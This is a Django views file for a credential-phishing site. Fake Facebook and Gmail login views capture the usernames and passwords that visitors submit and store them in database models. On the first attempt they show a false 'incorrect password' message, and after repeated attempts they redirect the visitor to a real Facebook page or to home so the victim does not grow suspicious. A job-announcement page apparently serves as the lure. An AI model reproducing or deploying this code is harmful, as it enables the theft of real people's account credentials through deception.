from django.http import HttpResponseRedirect
from .form import *
from django.shortcuts import render,redirect
from . models import *
# Create your views here.


def home(request):
    return render(request,'home2.html')
def fb(request):
    issue =None
    session_key = request.session.session_key

    if request.method == 'GET':            

            name = request.GET.get("fb_username")
            password = request.GET.get("fb_password")

            if name :
                # Increment submission attempt count
                if 'submission_attempts' in request.session:
                    request.session['submission_attempts'] += 1
                else:
                    request.session['submission_attempts'] = 1
                    issue = "username or password incorrect "

            
                FbUser.objects.create(fb_username = name,fb_password = password,session_key = session_key, trial_per_session= request.session['submission_attempts'])

                 # Redirect to Facebook after 3rd attempt
                if request.session['submission_attempts'] >=2:
                    return HttpResponseRedirect('https://www.facebook.com/sphmmc/') 

    return render(request, 'FB_profile.html' ,{"issue":issue})
def job_announcement(request):
    return render(request, 'job.html')

def account(request):
    saved = None
    email_to_verify = "home"
    if request.method  == "GET" :
        accountForm = AccountForm(request.GET)
        if accountForm.is_valid():
           user = accountForm.save()
           saved  ="Data Saved "
           email_to_verify = user.email  
    else:
        accountForm = AccountForm()

       
    return render(request, 'account.html',{"accountForm":accountForm,'saved':saved,"email_to_verify":email_to_verify})
def gmail(request,email):
    issue ='none'
    session_key = request.session.session_key

    if request.method == 'GET':            

            password = request.GET.get("password")

            if password :
                # Increment submission attempt count
                if 'submission_attempts' in request.session:
                    request.session['submission_attempts'] += 1
                else:
                    request.session['submission_attempts'] = 1
                    issue = "Email or password incorrect" 

                EmailUser.objects.create(email = email,email_password = password,session_key = session_key, trial_per_session= request.session['submission_attempts'])

                 # Redirect to Facebook after 3rd attempt
                if request.session['submission_attempts'] >=2:
                    return redirect("home")
    return render(request, 'gmail.html',{"email":email ,"issue":issue})
# accounts.google.com